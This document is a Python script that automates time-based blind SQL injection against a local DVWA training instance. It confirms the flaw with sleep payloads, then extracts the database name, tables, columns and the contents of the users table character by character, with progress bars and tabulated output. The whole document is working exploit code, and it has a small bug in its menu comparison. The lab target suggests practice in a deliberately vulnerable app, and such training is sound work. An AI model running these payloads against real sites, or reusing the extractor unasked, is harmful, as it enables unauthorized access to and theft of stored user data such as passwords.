# DVWA Blind SQLi script

import requests
import time
import pyfiglet
from tqdm.auto import tqdm
from tabulate import tabulate
 
class Injection:
    def __init__(self):
        self.url = "http://127.0.0.1/dvwa/vulnerabilities/sqli_blind/"
        self.db_len = 0
        self.db_name = []
        self.col_name_list = []
        self.headers = {
    "Cookie": "PHPSESSID="+input("PHPSESSID:")+"; security=medium"
}
 
    def str2hex(self, str1):
        result = '0x'
        for i in str1:
            result +=hex(ord(i))[2:]
        return result
 
    def check_exploit(self, query):
        data = {
            "id": f"1 {query}",
            "Submit": "Submit"
        }
        start_time = time.time()
        requests.post(url=self.url, data=data, headers=self.headers)
        end_time = time.time()
        # print(end_time - start_time)
        if end_time - start_time > 3:
            return True
 
    def login(self):
        """try login with cookie"""
        resp = requests.post(url=self.url, data={"id": "1", "Submit": "Submit"}, headers=self.headers)
        if "User ID exists in the database" in resp.text:
            print("------------------------------------------------------------------------")
 
    def check_time_based(self):
        """check whether it's a time-based SQL injection (blind)"""
        if self.check_exploit("and sleep(3) # "):
            print("It is vulnerable to SQL injection!")
        else:
            print("It isn't vulnerable to SQL injection.")
 
    def get_dbname(self):
        print("\nRetrieving database name......")
        for i in range(21):
            if self.check_exploit(f"and length(database())={i} and sleep(3) # "):
                self.db_len = i
        print("Length of database name is : " + str(self.db_len))
        for i in range(1, self.db_len + 1):
            # range(46, 122+1) is capital letters, numbers and underscore [ASCII]
            for j in range(46, 122 + 1):
                query_name = f"and ascii(substr(database(),{i},1))={j} and sleep(3)# "
                if self.check_exploit(query_name):
                    self.db_name.append(chr(j))
        name = "".join(self.db_name)
        print("Database name is : " + name)
        print("Finish retrieving database name.")
 
    def get_tbname(self):
        print('\nRetrieving tables in the database......')
        tb_len = []
        for i in range(20):
            query_name = f"and if((select count(table_name) from information_schema.tables where table_schema=database())={i}, sleep(3), 1) #"
            if self.check_exploit(query_name):
                print(f"There are {i} tables in the database.")
                tb_count = i
                break
        for i in range(1, tb_count+1):
            for j in range(20):
                query_name = f"and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit {i-1},{i}),1))={j},sleep(3),1) #"
                if self.check_exploit(query_name):
                    print(f"The length of the name of table {i} is {j}.")
                    tb_len.append(j)
        # print(tb_len)
        for i in range(tb_count):
            tb_name = []
            for j in range(tb_len[i]):
                # range(46, 122+1) is capital letters, numbers and underscore [ASCII]
                for k in range(46, 123):
                    query_name = f"and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit {i},{i+1}),{j+1}))={k} and sleep(3) # "
                    if self.check_exploit(query_name):
                        tb_name.append(chr(k))
                        # print(k)
            print(f"Name of the table {i+1} is : " + "".join(tb_name))
        print("Finish retrieving tables' name.\n")
 
    def get_col(self):
        tb_name = input("Table interested:")
        tb_name_hex = self.str2hex(tb_name)
        col_count = 0
        for i in range(20):
            query_name = f"and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name={tb_name_hex})={i}, sleep(3), 1) #"
            if self.check_exploit(query_name):
                print(f"There are {i} columns in the table, {tb_name}.")
                col_count = i
                break
        # print(tb_name_hex)
        col_name_len = []
        col_name_len_pbar = tqdm(total=col_count, desc="Counting the length of the name of each column", position=0, leave=True)
        for i in range(1, col_count+1):
            for j in range(20):
                query_name = f"and if(length(substr((select column_name from information_schema.columns where table_schema=database() and table_name={tb_name_hex} limit {i-1},1),1))={j},sleep(3),1) #"
                if self.check_exploit(query_name):
                    # print(f"The length of the name of column {i} is {j}.")
                    col_name_len.append(j)
                    col_name_len_pbar.update(1)
        col_name_len_pbar.close()
        # print("\n"+col_name_len)
        col_name_list_pbar = tqdm(total=col_count, desc="Updating column name list", position=0, leave=True)
        for i in range(col_count):
            col_name = []
            for j in range(col_name_len[i]):
                # range(46, 122+1) is capital letters, numbers and underscore [ASCII]
                for k in range(46, 123):
                    query_name = f"and ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name={tb_name_hex} limit {i},1),{j+1}))={k} and sleep(3) # "
                    if self.check_exploit(query_name):
                        col_name.append(chr(k))
                        # print(k)
            name = "".join(col_name)
            # print(f"Name of the column {i+1} is : " + name)
            self.col_name_list.append(name)
            col_name_list_pbar.update(1)
        col_name_list_pbar.close()
        print(self.col_name_list)
        print("Finish retrieving columns' name.\n")
 
    def get_data(self):
        print("\nRetrieving data......")
        data = {}
        list(map(lambda x: print(f'{x[0]}:{x[1]}'), [(x, y) for x, y in enumerate(self.col_name_list)]))
 
        tb_name = input("Table interested:")
        col_name = input("Column interested:")
        field_name_len = []
        for i in range(5):
            for j in range(35):
                query_name = f"and if(length(substr((select {col_name} from {tb_name} limit {i},1),1))={j}, sleep(3), 1) #"
                if self.check_exploit(query_name):
                    # print(f"The length of the name of field {i+1} is {j}.")
                    field_name_len.append(j)
        # print(field_name_len)
        for i in range(5):
            field_name = []
            for j in range(field_name_len[i]):
                # range(46, 122+1) is capital letters, numbers and underscore [ASCII]
                for k in range(46, 123):
                    query_name = f"and ascii(substr((select {col_name} from {tb_name} limit {i},1), {j+1}, 1))={k} and sleep(3) #"
                    if self.check_exploit(query_name):
                        field_name.append(chr(k))
            name = "".join(field_name)
            print(f"Name of the field {i + 1} is : " + name)
        print(f"Finish retrieving data in {col_name}.\n")
 
    def get_all_data(self):
        print("\nRetrieving data......")
        data = {}
        for i in range(len(self.col_name_list)):
            print(self.col_name_list[i])
            field_name_len = []
            field_name_len_pbar = tqdm(total=5,desc=f"Counting length of each field name in {self.col_name_list[i]}", position=0, leave=True)
            for j in range(5):
                for k in range(35):
                    query_name = f"and if(length(substr((select {self.col_name_list[i]} from users limit {j},1),1))={k}, sleep(3), 1) #"
                    if self.check_exploit(query_name):
                        # print(f"The length of the name of field {j+1} is {k}.")
                        field_name_len.append(k)
                        field_name_len_pbar.update(1)
            field_name_len_pbar.close()
            field_name_list = []
            field_name_list_pbar = tqdm(total=5, desc=f"Updating field name list for {self.col_name_list[i]}", position=0, leave=True)
            for j in range(5):
                field_name = []
                for k in range(field_name_len[j]):
                    # range(46, 122+1) is capital letters, numbers and underscore [ASCII]
                    for l in range(46, 123):
                        query_name = f"and ascii(substr((select {self.col_name_list[i]} from users limit {j},1), {k + 1}, 1))={l} and sleep(3) #"
                        if self.check_exploit(query_name):
                            field_name.append(chr(l))
                name = "".join(field_name)
                field_name_list.append(name)
                field_name_list_pbar.update(1)
                # print(f"Name of the field {j + 1} is : " + name)
            field_name_list_pbar.close()
            data[self.col_name_list[i]] = field_name_list
            print()
        print(data)
        print("Finish retrieving data in \"users\".\n")
 
        dataframe = [[], [], [], [], []]
        data_list = list(data.values())
        # print(data_list)
        for i in range(len(data_list[0])):
            for j in range(len(data_list)):
                dataframe[i].append(data_list[j][i])
        print(tabulate(dataframe, headers=data.keys()))
 
 
if __name__ == '__main__':
    custom_fig = pyfiglet.Figlet(font='graffiti')
    print(custom_fig.renderText('SQL Injection (Blind)'))
    blind = Injection()
    blind.login()
    blind.check_time_based()
    blind.get_dbname()
    blind.get_tbname()
    blind.get_col()
    print("0: Select all data from 'users' table 1:Select specified data")
    choice = input("Tell us your choice (0/1):")
    if choice == 1:
        blind.get_data()
    else:
        blind.get_all_data()
